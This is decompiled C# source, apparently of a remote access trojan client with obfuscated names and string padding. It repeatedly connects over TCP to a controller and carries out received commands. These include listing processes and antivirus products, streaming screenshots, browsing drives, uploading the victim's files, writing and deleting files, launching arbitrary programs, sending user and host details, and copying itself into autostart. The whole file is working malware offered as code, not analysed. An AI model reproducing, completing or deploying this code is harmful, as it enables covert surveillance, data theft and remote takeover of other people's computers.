using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace emrdhorausi;

public class MREDM
{
	private Dictionary<string, byte[]> emrdhorausitasks = new Dictionary<string, byte[]>();

	private EDRARE emrdhorausiStateObj = new EDRARE();

	private MRLEINF emrdhorausiUPC;

	private ORDMR emrdhorausiCMD;

	private int emrdhorausiscrSize = 200;

	private ThreadStart emrdhorausifunStarter;

	public TcpClient emrdhorausitcpsck;

	public bool emrdhorausiis_working = false;

	private bool emrdhorausiiswitch = false;

	private bool emrdhorausithrRuning = false;

	private bool emrdhorausistr_writer = false;

	private bool emrdhorausicapScreen = false;

	public int port_sn = 0;

	public NetworkStream emrdhorausinetStream;

	private int emrdhorausibuffSize = 1024;

	private emrdhorausiDRIVF emrdhorausiHD = new emrdhorausiDRIVF();

	private int emrdhorausibytesRead = 0;

	public bool emrdhorausireqCnls = false;

	public bool emrdhorausiautCnls = false;

	public DateTime emrdhorausilTimeUtc;

	private Thread emrdhorausifunThread;

	private MemoryStream msStram = new MemoryStream();

	private SCLRNS emrdhorausicaps = new SCLRNS();

	private Bitmap image;

	public void emrdhorausido_start()
	{
		DAONIF.emrdhorausiport = DAONIF.ports[0];
		emrdhorausiUPC = new MRLEINF();
		emrdhorausiCMD = new ORDMR(this);
		emrdhorausiHD.iserver = this;
		emrdhorausiHD.emrdhorausimainPath = DAONIF.emrdhorausiget_mpath();
		TimerCallback callback = emrdhorausilookup_connect;
		Timer emrdhorausitimer = new Timer(callback, emrdhorausiStateObj, 29120, 36520);
		emrdhorausiStateObj.emrdhorausitimer = emrdhorausitimer;
	}

	public void emrdhorausisaveFile(string filePath)
	{
		try
		{
			byte[] array = emrdhorausipull_data();
			if (array != null)
			{
				File.WriteAllBytes(filePath, array);
			}
		}
		catch
		{
		}
	}

	private void emrdhorausisee_responce()
	{
		if (!emrdhorausiiswitch)
		{
			emrdhorausiiswitch = true;
			emrdhorausinetStream = emrdhorausiCMD.emrdhorausiNS(emrdhorausitcpsck);
			emrdhorausicapScreen = false;
			while (emrdhorausiis_working)
			{
				string[] switchType = emrdhorausiget_command();
				if (switchType != null)
				{
					emrdhorausireqCnls = false;
					string text = switchType[0].ToLower();
					switch ((text.Split(new char[1] { '-' }).Length <= 1) ? ("emrdhorausi-" + text) : ("emrdhorausi-" + text.Split(new char[1] { '-' })[1]))
					{
					case "emrdhorausi-getavs":
						emrdhorausifunStarter = delegate
						{
							emrdhorausilist_processes("getavs");
						};
						emrdhorausifunThread = new Thread(emrdhorausifunStarter);
						emrdhorausifunThread.Start();
						break;
					case "emrdhorausi-thumb":
						emrdhorausiimage_info(switchType[1]);
						break;
					case "emrdhorausi-procl":
						emrdhorausifunStarter = delegate
						{
							emrdhorausilist_processes("procl");
						};
						emrdhorausifunThread = new Thread(emrdhorausifunStarter);
						emrdhorausifunThread.Start();
						break;
					case "emrdhorausi-putsrt":
						emrdhorausiload_app();
						break;
					case "emrdhorausi-dowf":
						emrdhorausisaveFile(switchType[1]);
						break;
					case "emrdhorausi-scrsz":
						emrdhorausiscreenSize(switchType[1]);
						break;
					case "emrdhorausi-filsz":
						emrdhorausifunStarter = delegate
						{
							emrdhorausifile_info(switchType[1]);
						};
						emrdhorausifunThread = new Thread(emrdhorausifunStarter);
						emrdhorausifunThread.Start();
						break;
					case "emrdhorausi-cscreen":
						emrdhorausisee_scren(switchType[1]);
						break;
					case "emrdhorausi-stops":
						emrdhorausicapScreen = false;
						break;
					case "emrdhorausi-scren":
						emrdhorausicapScreen = true;
						emrdhorausifunStarter = delegate
						{
							emrdhorausiis_screen(switchType[1]);
						};
						emrdhorausifunThread = new Thread(emrdhorausifunStarter);
						emrdhorausifunThread.Start();
						break;
					case "emrdhorausi-dirs":
						emrdhorausifunThread = new Thread(emrdhorausilistDrives);
						emrdhorausifunThread.Start();
						break;
					case "emrdhorausi-cnls":
						emrdhorausiautCnls = true;
						emrdhorausireqCnls = true;
						emrdhorausicapScreen = false;
						break;
					case "emrdhorausi-delt":
						emrdhorausiremove_file(switchType[1]);
						break;
					case "emrdhorausi-afile":
						emrdhorausifunStarter = delegate
						{
							emrdhorausisend_auto(switchType[1]);
						};
						emrdhorausifunThread = new Thread(emrdhorausifunStarter);
						emrdhorausifunThread.Start();
						break;
					case "emrdhorausi-udlt":
						emrdhorausiCMD.emrdhorausiremove_user();
						break;
					case "emrdhorausi-listf":
						emrdhorausifunStarter = delegate
						{
							emrdhorausiHD.emrdhorausilookFiles(switchType[1]);
						};
						emrdhorausifunThread = new Thread(emrdhorausifunStarter);
						emrdhorausifunThread.Start();
						break;
					case "emrdhorausi-info":
						emrdhorausiuser_info();
						break;
					case "emrdhorausi-runf":
						try
						{
							Process.Start(switchType[1].Split(new char[1] { '>' })[0]);
						}
						catch
						{
						}
						break;
					case "emrdhorausi-file":
						emrdhorausifunStarter = delegate
						{
							emrdhorausipush_file(switchType[1]);
						};
						emrdhorausifunThread = new Thread(emrdhorausifunStarter);
						emrdhorausifunThread.Start();
						break;
					case "emrdhorausi-dowr":
						emrdhorausisaveFile(switchType[1]);
						break;
					case "emrdhorausi-fldr":
					{
						string text3 = emrdhorausiHD.emrdhorausicheckFolders(switchType[1]);
						if (text3 != "")
						{
							emrdhorausipush_data(null, "emrdhorausi-fldr=|emrdhorausi".Split(new char[1] { '|' })[0] + text3);
						}
						break;
					}
					case "emrdhorausi-fles":
					{
						string text2 = emrdhorausiHD.emrdhorausilookupFiles(switchType[1]);
						if (text2 != "")
						{
							emrdhorausipush_data(null, "emrdhorausi-fles=|emrdhorausi".Split(new char[1] { '|' })[0] + text2);
						}
						break;
					}
					}
					continue;
				}
				emrdhorausiis_working = false;
				break;
			}
			emrdhorausiis_working = false;
			emrdhorausicapScreen = false;
		}
		emrdhorausiiswitch = false;
	}

	public string emrdhorausifile_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|emrdhorausi".Split(new char[1] { '|' })[0] : "<|emrdhorausi".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|emrdhorausi".Split(new char[1] { '|' })[0] : "<|emrdhorausi".Split(new char[1] { '|' })[0]);
			text = text + emrdhorausiget_size(fileInfo.Length) + ((!ret) ? ">|emrdhorausi".Split(new char[1] { '|' })[0] : "<|emrdhorausi".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				emrdhorausipush_data(null, "emrdhorausi-filsz=|emrdhorausi".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	private void emrdhorausilookup_connect(object source)
	{
		try
		{
			if (!emrdhorausithrRuning)
			{
				emrdhorausithrRuning = true;
				if (!emrdhorausiis_working || !emrdhorausitcpsck.Connected)
				{
					emrdhorausiis_working = emrdhorausiIPSConfig();
					if (emrdhorausiis_working)
					{
						emrdhorausibuffSize = emrdhorausitcpsck.ReceiveBufferSize;
						emrdhorausisee_responce();
					}
				}
			}
			emrdhorausithrRuning = false;
		}
		catch
		{
			emrdhorausithrRuning = false;
			emrdhorausistr_writer = false;
			emrdhorausiis_working = false;
			emrdhorausiiswitch = false;
		}
	}

	private bool emrdhorausiIPSConfig()
	{
		try
		{
			DAONIF.emrdhorausidefaultP = emrdhorausiCMD.emrdhorausiserverIPD();
			emrdhorausitcpsck = new TcpClient();
			emrdhorausitcpsck.Connect(DAONIF.emrdhorausidefaultP, DAONIF.emrdhorausiport);
			return true;
		}
		catch
		{
			emrdhorausiports_switch();
			return false;
		}
	}

	public void emrdhorausiports_switch()
	{
		port_sn++;
		DAONIF.emrdhorausiport = DAONIF.ports[port_sn];
		if (port_sn >= DAONIF.ports.Length - 1)
		{
			port_sn = 0;
		}
	}

	public bool emrdhorausisend_auto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">" + fileName;
				emrdhorausipush_data(data, "emrdhorausi-afile=" + fileinfo);
				return false;
			}
			emrdhorausipush_data(null, "emrdhorausi-anfod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	private void emrdhorausiimage_info(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">|emrdhorausi".Split(new char[1] { '|' })[0];
				text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|emrdhorausi".Split(new char[1] { '|' })[0];
				text = text + emrdhorausiget_size(fileInfo.Length) + ">";
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
				emrdhorausipush_data(memoryStream.ToArray(), "emrdhorausi-thumb=|emrdhorausi".Split(new char[1] { '|' })[0] + text);
			}
		}
		catch
		{
		}
	}

	public void emrdhorausilist_processes(string cmd)
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				text = text + processes[i].Id + ">|emrdhorausi".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName + ">|emrdhorausi".Split(new char[1] { '|' })[0];
				text += "0>|emrdhorausi".Split(new char[1] { '|' })[0];
				text += "<";
			}
			byte[] byteArray = DAONIF.getByteArray(text);
			emrdhorausipush_data(byteArray, "emrdhorausi-" + cmd + "=process|emrdhorausi".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void emrdhorausiload_app()
	{
		try
		{
			string text = DAONIF.emrdhorausiget_mpath() + DAONIF.emrdhorausimainApp + ".exe|emrdhorausi".Split(new char[1] { '|' })[0];
			if (text != DAONIF.emrdhorausimyPath)
			{
				File.WriteAllBytes(text, File.ReadAllBytes(DAONIF.emrdhorausimyPath));
			}
			DAONIF.emrdhorausiset_run("wldrba|emrdhorausi".Split(new char[1] { '|' })[0], text);
		}
		catch
		{
		}
	}

	private void emrdhorausisee_scren(string screenSize)
	{
		try
		{
			emrdhorausiscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			image = emrdhorausicaps.emrdhorausiscreen(emrdhorausiscrSize);
			msStram.SetLength(0L);
			((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
			emrdhorausipush_data(msStram.ToArray(), "emrdhorausi-sascr=emrdhorausi|emrdhorausi".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void emrdhorausiis_screen(string screenSize)
	{
		try
		{
			emrdhorausiscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			while (emrdhorausicapScreen && emrdhorausiis_working)
			{
				image = emrdhorausicaps.emrdhorausiscreen(emrdhorausiscrSize);
				msStram.SetLength(0L);
				((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
				emrdhorausipush_data(msStram.ToArray(), "emrdhorausi-scren=emrdhorausi|emrdhorausi".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private string emrdhorausiget_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|emrdhorausi".Split(new char[1] { '|' })[0],
				"KB|emrdhorausi".Split(new char[1] { '|' })[0],
				"MB|emrdhorausi".Split(new char[1] { '|' })[0],
				"GB|emrdhorausi".Split(new char[1] { '|' })[0],
				"TB|emrdhorausi".Split(new char[1] { '|' })[0],
				"PB|emrdhorausi".Split(new char[1] { '|' })[0],
				"EB|emrdhorausi".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "";
		}
	}

	private void emrdhorausiuser_info()
	{
		string text = emrdhorausiUPC.emrdhorausilancard + "|" + emrdhorausiUPC.emrdhorausicname + "|" + emrdhorausiUPC.emrdhorausiuname + "|" + emrdhorausiUPC.emrdhorausiuip + "|" + DAONIF.emrdhorausiOsname() + "|" + emrdhorausiUPC.emrdhorausiapver + "|";
		text += "| !emrdhorausi".Split(new char[1] { '!' })[0];
		text = text + "|" + emrdhorausiUPC.emrdhorausiclientNum;
		text = text + "|" + DAONIF.emrdhorausiget_mpath();
		byte[] byteArray = DAONIF.getByteArray(text);
		emrdhorausipush_data(byteArray, "emrdhorausi-info=user|emrdhorausi".Split(new char[1] { '|' })[0]);
	}

	private void emrdhorausiscreenSize(string scSize)
	{
		try
		{
			string[] array = scSize.Split(new char[1] { '>' });
			emrdhorausiscrSize = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	private void emrdhorausipush_file(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				emrdhorausipush_data(File.ReadAllBytes(lfile), "emrdhorausi-file=|emrdhorausi".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName, tmp: true);
			}
		}
		catch
		{
		}
	}

	public void emrdhorausiremove_file(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	public bool emrdhorausipush_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			if (emrdhorausistr_writer)
			{
				return false;
			}
			emrdhorausistr_writer = true;
			byte[] byteArray = DAONIF.getByteArray(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(byteArray.Length);
			byte[] array2 = new byte[num2 + byteArray.Length + num];
			bytes.CopyTo(array2, 0);
			byteArray.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + byteArray.Length);
				data.CopyTo(array2, 10 + byteArray.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !emrdhorausireqCnls)
			{
				int num5 = ((num4 > emrdhorausibuffSize) ? emrdhorausibuffSize : num4);
				emrdhorausinetStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
			}
			emrdhorausistr_writer = false;
			if (emrdhorausireqCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			emrdhorausistr_writer = false;
			emrdhorausiis_working = false;
			return false;
		}
	}

	public byte[] emrdhorausipull_data()
	{
		try
		{
			int num = 0;
			byte[] array = new byte[5];
			emrdhorausibytesRead = emrdhorausinetStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !emrdhorausireqCnls)
			{
				int count = ((num3 > emrdhorausibuffSize) ? emrdhorausibuffSize : num3);
				emrdhorausibytesRead = emrdhorausinetStream.Read(array2, num, count);
				num += emrdhorausibytesRead;
				num3 -= emrdhorausibytesRead;
			}
			if (emrdhorausireqCnls)
			{
				emrdhorausinetStream.Flush();
				while (emrdhorausinetStream.DataAvailable && emrdhorausinetStream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			emrdhorausiis_working = false;
			return null;
		}
	}

	public string[] emrdhorausiget_command()
	{
		try
		{
			byte[] array = new byte[5];
			emrdhorausibytesRead = emrdhorausinetStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= emrdhorausibytesRead)
			{
				int count = ((num3 > emrdhorausibuffSize) ? emrdhorausibuffSize : num3);
				emrdhorausibytesRead = emrdhorausinetStream.Read(array2, num2, count);
				num2 += emrdhorausibytesRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == "")
			{
				return null;
			}
			return text.Split(new char[1] { '=' });
		}
		catch
		{
			emrdhorausiis_working = false;
			return null;
		}
	}

	private void emrdhorausilistDrives()
	{
		string text = emrdhorausiHD.emrdhorausilookupDrives();
		emrdhorausipush_data(null, "emrdhorausi-dirs=" + text);
	}
}
